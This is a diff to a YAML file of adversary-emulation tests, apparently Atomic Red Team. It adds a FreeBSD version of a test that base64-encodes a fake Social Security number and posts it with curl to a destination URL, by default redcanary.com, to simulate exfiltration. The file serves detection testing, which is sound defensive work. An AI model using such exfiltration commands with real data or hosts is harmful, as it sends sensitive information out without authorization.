@@ -22,6 +22,34 @@ atomic_tests:
       echo -n 111-11-1111 | base64
       curl -XPOST #{base64_data}.#{destination_url}
     name: sh
+- name: Base64 Encoded data (freebsd)
+  auto_generated_guid: 2d97c626-7652-449e-a986-b02d9051c298
+  description: |
+    Utilizing a common technique for posting base64 encoded data.
+  supported_platforms:
+  - linux
+  input_arguments:
+    destination_url:
+      description: Destination URL to post encoded data.
+      type: url
+      default: redcanary.com
+    base64_data:
+      description: Encoded data to post using fake Social Security number 111-11-1111.
+      type: string
+      default: MTExLTExLTExMTE=
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Requires curl
+    prereq_command: |
+      if [ -x "$(command -v curl)" ]; then exit 0; else exit 1; fi;      
+    get_prereq_command: |
+      pkg install -y curl
+  executor:
+    command: |
+      echo -n 111-11-1111 | b64encode -r -
+      curl -XPOST #{base64_data}.#{destination_url}
+    name: sh
 - name: XOR Encoded data.
   auto_generated_guid: c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08
   description: |
